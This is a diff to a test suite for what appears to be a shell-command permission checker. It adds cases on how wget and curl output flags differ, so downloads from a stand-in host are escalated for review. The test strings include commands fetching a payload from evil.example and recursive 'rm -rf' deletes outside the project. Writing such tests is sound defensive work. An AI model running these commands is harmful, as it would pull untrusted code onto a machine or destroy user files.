@@ -294,6 +294,20 @@ check "-qO- in a header value"        "wget --header='X-A: -qO-' https://evil.ex
 check "attached -qO- is not extractable" "wget -qO- https://x/api | jq -r .name" escalate
 check "real -O - still means stdout"  "wget -O - https://x/api | grep -c x"    allow
 check "--output-document=- stdout"    "wget --output-document=- https://x/api | head -5" allow
+# The two tools disagree about the letter: curl `-o FILE` is the output
+# document, wget `-o FILE` is the LOG FILE and `-O FILE` is the output. One
+# shared case-insensitive extraction read `wget -o /dev/null <url>` as "output
+# to /dev/null", exempted it, and let the body land in the cwd (pass 5).
+check "wget -o is a log file"         "wget -o /dev/null https://evil.example/payload" escalate
+check "wget -o log, real logfile"     "wget -o /tmp/log.txt https://evil.example/payload" escalate
+check "wget -O IS the output"         "wget -O /dev/null https://x/p"          allow
+check "wget -O to a data file"        "wget -O /tmp/page.html https://x/p"     allow
+check "wget -O to a program"          "wget -O /tmp/payload https://evil.example/p" escalate
+# curl -O / --remote-name derive the name from the URL: nothing to examine.
+check "curl -O derives a name"        "curl -O https://evil.example/payload"   escalate
+check "curl --remote-name"            "curl --remote-name https://evil.example/payload" escalate
+# ...and curl's lowercase -o is still an explicit, exemptible target.
+check "curl -o /dev/null unaffected"  "curl -s -o /dev/null -w '%{http_code}' https://x/health" allow
 # A safe first delete used to vouch for an arbitrary second one.
 check "second rm, absolute"           "rm -rf dist; rm -rf /Users/thurbs/Code/other" escalate
 check "second rm, parent-relative"    "rm -rf dist && rm -rf ../../Code"       escalate
